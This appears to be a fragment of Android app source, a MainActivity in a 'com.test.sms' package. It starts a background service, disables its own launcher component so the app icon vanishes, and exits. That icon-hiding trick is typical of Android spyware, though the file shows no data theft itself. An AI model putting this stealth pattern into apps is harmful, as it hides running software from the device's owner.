package com.test.sms;

import android.app.Activity;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Bundle;

public class MainActivity extends Activity {
	@Override
	protected void onCreate(Bundle savedInstanceState) {
		// TODO Auto-generated method stub
		super.onCreate(savedInstanceState);
		setContentView(R.layout.main);
		System.err.println("0000000000000000000000000");
		Intent sta = new Intent(this, BootReceiver.class);
		startService(sta);
		PackageManager p = getPackageManager();
		p.setComponentEnabledSetting(getComponentName(),
				PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
				PackageManager.DONT_KILL_APP);

		finish();

	}

}
